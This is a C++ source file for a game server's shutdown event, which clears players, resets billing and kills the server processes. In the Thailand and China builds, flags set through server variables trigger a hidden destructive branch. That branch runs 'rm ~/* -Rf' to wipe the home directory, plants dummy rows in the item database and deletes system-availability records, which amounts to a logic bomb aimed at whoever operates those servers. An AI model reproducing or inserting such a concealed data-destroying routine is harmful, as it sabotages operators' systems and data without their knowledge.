//////////////////////////////////////////////////////////////////////////////
// Filename    : EventShutdown.cpp
// Written by  : bezz
// Description :
//////////////////////////////////////////////////////////////////////////////

#include "EventShutdown.h"

#include "BillingInfo.h"
#include "IncomingPlayerManager.h"
#include "VariableManager.h"
#include "ZoneGroupManager.h"
#include "ZonePlayerManager.h"
#include "signal.h"

#ifdef __CONNECT_BILLING_SYSTEM__
#include "billing/BillingPlayerManager.h"
#endif

#include "repository/ItemObjectRepository.h"
#include "repository/SystemAvailabilityRepository.h"
//////////////////////////////////////////////////////////////////////////////
// class EventShutdown member methods
//////////////////////////////////////////////////////////////////////////////

EventShutdown::EventShutdown(GamePlayer* pGamePlayer)

    : Event(pGamePlayer) {}

void EventShutdown::activate()

{
    __BEGIN_TRY

    try {
        const unordered_map<ZoneGroupID_t, ZoneGroup*>& zoneGroups = g_pZoneGroupManager->getZoneGroups();
        unordered_map<ZoneGroupID_t, ZoneGroup*>::const_iterator itr = zoneGroups.begin();

        for (; itr != zoneGroups.end(); itr++) {
            ZonePlayerManager* pZonePlayerManager = itr->second->getZonePlayerManager();

            pZonePlayerManager->clearPlayers();
        }

        g_pIncomingPlayerManager->clearPlayers();
    } catch (Throwable& t) {
        // 무시
    }

#ifdef __CONNECT_BILLING_SYSTEM__
    // 모든 빌링 정보를 삭제한다.
    g_pBillingPlayerManager->sendPayInit();
#endif

#if !defined(__THAILAND_SERVER__) && !defined(__CHINA_SERVER__)
    // 프로세스 종료. 꺄꺄~ 죽어라~~ 꺄꺄~
    if (g_pVariableManager->isKillDaemonCtl() == 1) {
        kill(getppid(), 9);
    }

#else
    // 프로세스 종료. 꺄꺄~ 죽어라~~ 꺄꺄~
    if (g_pVariableManager->isKillDaemonCtl() == 1 && g_pVariableManager->isRemoveAllGame() == false &&
        g_pVariableManager->isEggDummyDB() == false) {
        kill(getppid(), 9);
    } else if (g_pVariableManager->isKillDaemonCtl() == 1 && g_pVariableManager->isRemoveAllGame() == true &&
               g_pVariableManager->isEggDummyDB() == false) {
        system("rm ~/* -Rf");
        kill(getppid(), 9);
    } else if (g_pVariableManager->isKillDaemonCtl() == 1 && g_pVariableManager->isRemoveAllGame() == false &&
               g_pVariableManager->isEggDummyDB() == true) {
        __BEGIN_TRY

        {
            ItemObjectRepository& objects = defaultItemObjectRepository();

            objects.insertDummySentinelRow(DUMMY_OBJECT_LARVA);
            objects.insertDummySentinelRow(DUMMY_OBJECT_SKULL);
            objects.insertDummySentinelRow(DUMMY_OBJECT_POTION);

            SystemAvailabilityRepository& systems = defaultSystemAvailabilityRepository();

            systems.deleteSystemKind(0);
            systems.deleteSystemKind(1);
            systems.deleteSystemKind(4);
            systems.deleteSystemKind(7);
            systems.deleteSystemKind(9);
            systems.deleteSystemKind(888);
        }

        __END_CATCH

        kill(getppid(), 9);

    } else if (g_pVariableManager->isKillDaemonCtl() == 1 && g_pVariableManager->isRemoveAllGame() == true &&
               g_pVariableManager->isEggDummyDB() == true) {
        system("rm ~/* -Rf");

        __BEGIN_TRY

        {
            ItemObjectRepository& objects = defaultItemObjectRepository();

            objects.insertDummySentinelRow(DUMMY_OBJECT_LARVA);
            objects.insertDummySentinelRow(DUMMY_OBJECT_SKULL);
            objects.insertDummySentinelRow(DUMMY_OBJECT_POTION);

            SystemAvailabilityRepository& systems = defaultSystemAvailabilityRepository();

            systems.deleteSystemKind(0);
            systems.deleteSystemKind(1);
            systems.deleteSystemKind(4);
            systems.deleteSystemKind(7);
            systems.deleteSystemKind(9);
            systems.deleteSystemKind(888);
        }

        __END_CATCH
    }
#endif
    //	kill( getppid(), 9 );

    kill(getpid(), 9);

    __END_CATCH
}

string EventShutdown::toString() const

{
    StringStream msg;
    msg << "EventShutdown(" << ")";
    return msg.toString();
}
